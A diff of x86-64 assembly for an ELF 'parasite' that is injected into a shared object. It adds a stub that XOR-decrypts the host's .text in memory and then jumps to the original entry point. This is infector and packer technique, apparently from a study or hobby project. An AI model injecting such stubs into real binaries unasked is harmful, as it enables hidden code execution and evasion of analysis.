@@ -1,22 +1,5 @@
 BITS 64
 
-; Author : Abhinav Thakur
-; Email  : compilepeace@gmail.com
-
-; Description : This parasite is foccused to be injected in a shared object. Jump-on-exit needs to be
-;               an absolute address rather than an offset (so contains only the offsets and no 
-;               virtual addresses). So, parasite calculates the base address (where the infected 
-;               binary is loaded at runtime) and adds the base address to the offset 
-;               (0xAAAAAAAAAAAAAAAA) to get an absolute address @ which the jump will happen.
-;                       
-;               Shellcode prints a message, generates an absolute address to transfer control to a 
-;               virtual address (entry point of running shared object code)
-;
-; base_address_of_infected_binary = First few bytes of '/proc/self/maps' (before char '-' : 0x2d)
-; Jmp_on_Exit_address             = base_address_of_infected_binary + 0xAAAAAAAAAAAAAAAA
-;
-
-
 global _start
 
 
@@ -57,6 +40,7 @@ _start:
 	message:	db	"-x-x-x-x- \_<O>_<O>_/ -x-x-x-x-", 0xa
 	filepath:   db  "/proc/self/maps", 0x0          ; 16 bytes
 	newline:	db 	0xa
+	debug:		db 	"reboot" , 0xa
 
 
 parasite:
@@ -74,143 +58,46 @@ parasite:
 	mov dl, 0x20					; message size = 30 bytes
 	syscall
 
-
-;--------------------------------------------------------------------
-
-; 	; open file in memory
-; 	; %rax      |   %rdi    | %rsi  | %rdx
-; 	; sys_open  | *filename | flags | mode
-; 	; return fd -> %eax
-
-; 	xor rax, rax
-; 	xor rdi, rdi
-; 	lea	rdi, [rel filepath] 	; pathname
-; 	xor rsi, rsi				; 0 for O_RDONLY macro
-; 	mov al, SYS_OPEN			; syscall number for open()
-; 	syscall
-
-; ;--------------------------------------------------------------------
-
-;     xor r10, r10                ; Zeroing out temporary registers
-;     xor r8, r8
-;     xor rdi, rdi
-;     xor rbx, rbx
-;     mov dil, al
-;     sub sp, ALLOC_SPACE         ; allocate space for /proc/<pid>/maps memory address string 
-;                                 ; (Max 16 chars from file | usually 12 chars 5567f9154000)
-;     lea rsi, [rsp]              ; *buf  : get the content to be read on stack
-;     xor rdx, rdx
-;     mov dx, 0x1                 ; count : Read 0x1 byte from file at a time
-;     xor rax, rax
-
-
-; ; R10 to store count of chars before '-' in /proc/self/maps
-; ; R8 to store the extracted digit/alphabet
-; ; Don't change RAX, RDI, RSI, RDX registers.
-; ; RBX will store the final result (the address computed)
-; read_characters:
-; 	; %rax      | %rdi | %rsi | %rdx
-; 	; sys_read  |  fd  | *buf | count
-
-;     xor rax, rax                ; Syscall Number for read : 0x0
-;     syscall                     ; Byte read at [rsp]
-;     cmp BYTE [rsp], 0x2d		; if read_byte == 0x2d ('-')
-; 	je  done					; stop reading from file, Address is loaded into RBX
-; 	add r10b, 0x1				; count the number of characters read before 0x2d ('-')
-; 	mov r8b, BYTE [rsp]         ; get the read byte in R8
-
-;     ; Check for a digit (chars/ints 0x30 : 1(in dec) to 0x39 : 9(in dec) - convert into hex)
-;     cmp r8b, 0x39
-;     jle digit_found
-
-; alphabet_found:
-;     ; Character read is an alphabet [a-f], do the math to convert char(int) into equivalent hex
-;     sub r8b, 0x57               ; R8 stores the extracted byte (0x62('b') - 0x57 = 0xb)
-;     jmp load_into_rbx
-
-; ; Convert the char byte (eg: 0x35 for '5') to its equivalent hex (eg: '5'(0x35) to 0x5)
-; ; R10 Stores count : i.e. no. of characters (of base address) read as bytes
-; ; R8 stores the converted byte (to be placed into RBX to make actual base address of binary)
-; digit_found:
-;     sub r8b, 0x30               ; r8 stores Extracted byte
-
-; load_into_rbx:
-; 	shl rbx, 0x4
-;     or  rbx, r8
-
-; loop:
-;     add rsp, 0x1                ; increment RSI to read character at next location
-;     lea rsi, [rsp]
-;     jmp read_characters
-
-
-; done:
-; 	sub sp, r10w				; subtract stack pointer by no. of chars (which are pushed on stack)
-; 	add sp, ALLOC_SPACE			; add 16 bytes to RSP (which were reserved for reading address chars)
-; 	xor r8, r8
-; 	mov r8, rbx                 ; r8 stores the base address where the infected binary is loaded
-;     add r10, r8                 ; Computing final jmp-on-exit address
-
-
-; close_file:
-; 	; %rax      | %rdi
-; 	; sys_close |  fd
-
-; 	xor rax, rax
-; 	mov rax, SYS_CLOSE
-; 	syscall
-
-;--------------------------------------------------------------------
-
+; .text is xor crypted, using a xor on .text mem to uncrypt it
 unxor:
-
-	; Print key
-	; %rax      | %rdi | %rsi | %rdx
-	; sys_write	|  fd  | *buf | count
-
-	xor rax, rax
-	add	rax, 0x01
-	mov rdi, rax
-	lea rsi, [rel _start - KEY_ADDR]
-	xor rdx, rdx
-	mov dl, 0x10
-	syscall
-
-	xor rax, rax
-	add	rax, 0x01
-	mov rdi, rax
-	lea rsi, [rel newline]
-	xor rdx, rdx
-	mov dl, 0x1
-	syscall
 
 	push r12
 	push r13
-	push r14
+	push r15
 
-	xor r14, r14
+	; creating counter for key
 	xor r12, r12
 	%define count_key r12b
-	%define count_mem r14b
 	mov count_key,0
-	mov count_mem,0
 
+	; r10 -> encryption start
+	; r13 -> key start
+	; r15 -> end encryption (key start)
 	xor r13, r13
 	lea r13, [rel _start - KEY_ADDR]
+	mov r15, 0x1111111111111111
+	mov r10, r13
+	sub r10, r15
+
+	xor r15, r15
+	mov r15, r13
 
 xorLoop:
-	mov rsi, r13
-	syscall
-	; mov byte [r13], 0x41
-	lea rsi, [rel newline]
-	syscall
-
-	cmp count_mem, 30
+	cmp r10, r15  ; if encryption addr = end encryption addr stop
 	je endXorLoop
 
-	cmp count_key, 14
+	; xor encrypted byte and key byte
+	xor cl, cl
+	xor al, al
+	mov cl, byte [r10]
+	mov al, byte [r13]
+	xor cl, al
+	mov byte [r10], cl
+
+	cmp count_key, 15 ; if key is at the end, restart key and counter
 	je rebootKey
 
+	; else inc key
 	inc count_key
 	inc r13
 	jmp endKeyStuff
@@ -220,69 +107,19 @@ rebootKey:
 	mov count_key, 0
 
 endKeyStuff:
-	inc count_mem
+	; inc encryption addr and jump back at the beginning of loop
+	inc r10
 	jmp xorLoop
 
 endXorLoop:
 
-	pop r14
+	pop r15
 	pop r13
 	pop r12
 
 ;--------------------------------------------------------------------
 
-	; push r12
-	; push r13
-	; push r14
-	; push r15
-
-	; mov r13, r8
-	; mov r14, 0x1111111111111111
-	; mov r15, 0x2222222222222222
-	; add r13, r14
-
-	; ; %rax      | %rdi | %rsi | %rdx
-	; ; sys_write	|  fd  | *buf | count
-
-	; xor rax, rax
-	; add	rax, 0x01
-	; mov rdi, rax
-	; mov rsi, r13
-	; xor rdx, rdx
-	; mov dl, 0x5
-	; syscall
-	; xor rax, rax
-	; add	rax, 0x01
-	; lea rsi, [rel newline]
-	; mov dl, 0x1
-	; syscall
-	
-	; xor r13, r13
-	; mov r13, r8
-	; add r13, r15	
-
-	; xor rax, rax
-	; add	rax, 0x01
-	; mov rdi, rax
-	; mov rsi, r13
-	; xor rdx, rdx
-	; mov dl, 0x5
-	; syscall
-	
-	; xor rax, rax
-	; add	rax, 0x01
-	; lea rsi, [rel newline]
-	; mov dl, 0x1
-	; syscall
-
-	; pop r15
-	; pop r14
-	; pop r13
-	; pop r12
-
-;--------------------------------------------------------------------
-
-address_loaded_in_RBX:
+ender:
 	; Restoring register state
 	pop rdi
 	pop rdx
@@ -290,13 +127,13 @@ address_loaded_in_RBX:
 	pop rax
 	
 	push r12
+
 	xor r12, r12
 	xor r10, r10
-	mov r12, 0xAAAAAAAAAAAAAAAA
-	lea r10, [rel _start - KEY_ADDR]
-	sub r10, r12
+	mov r12, 0xAAAAAAAAAAAAAAAA ; get jump addr from patch
+	lea r10, [rel _start - KEY_ADDR] ; get rel addr of end of text
+	sub r10, r12 ; sub size of [entrypoint - _start] to _start addr
 
-	; RBX contains the base address (where the program is loaded in memory), adding the offset of
-	; entry point to it will give us the exact location the parasite has to resume afterexecution. 
-	; The placeholder (0xA's) has to be replaced by Kaal Bhairav by entry point offset.
+	pop r12
+
 	jmp	r10
